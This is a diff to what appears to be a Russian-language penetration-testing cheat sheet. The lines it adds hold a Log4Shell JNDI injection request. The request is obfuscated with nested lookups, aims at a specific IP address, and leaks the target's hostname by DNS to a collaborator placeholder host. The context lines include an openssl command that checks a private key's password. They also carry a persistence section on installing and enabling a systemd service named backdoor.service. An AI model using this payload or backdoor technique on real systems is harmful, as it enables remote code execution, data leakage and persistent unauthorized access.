@@ -146,6 +146,14 @@ https://bgp.he.net/
 openssl rsa -noout -in суке.pem -passin 'pass:**********' 2>/dev/null && echo 'Valid' || echo 'Not Valid'
 ```
 
+***Log4j***
+```
+GET /?x=${jndi:${lower:l}${lower:d}a${lower:p}://${:-116}.${hostname}.<collaborator_url>/a} HTTP/1.1
+Host: 195.235.1.1
+Connection: close
+```
+
+
 ***Закрепление***
 ### systemd (создать файл в /lib/systemd/system/backdoor.service и Запустить его командами: sudo systemctl enable backdoor.service && sudo systemctl start backdoor.service)
 
